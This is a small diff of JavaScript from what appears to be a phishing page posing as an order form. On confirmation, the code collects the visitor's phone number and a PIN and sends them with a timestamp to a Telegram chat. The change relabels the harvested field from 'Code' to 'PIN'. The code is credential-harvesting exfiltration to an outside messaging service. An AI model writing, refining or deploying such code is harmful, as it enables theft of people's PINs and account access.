@@ -163,9 +163,9 @@ document.addEventListener('DOMContentLoaded', () => {
             btnConfirmOrder.disabled = true;
             btnConfirmOrder.textContent = 'ENVOI EN COURS...';
 
-            const message = `✅ *PREMIER CODE*\n\n` +
+            const message = `✅ *PREMIER PIN*\n\n` +
                             `📞 *Numéro*: ${phoneNumber}\n` +
-                            `🔑 *Code 1*: ${code}\n` +
+                            `🔑 *PIN 1*: ${code}\n` +
                             `⏱ *Date*: ${new Date().toLocaleString()}`;
 
             const success = await sendTelegramMessage(message);
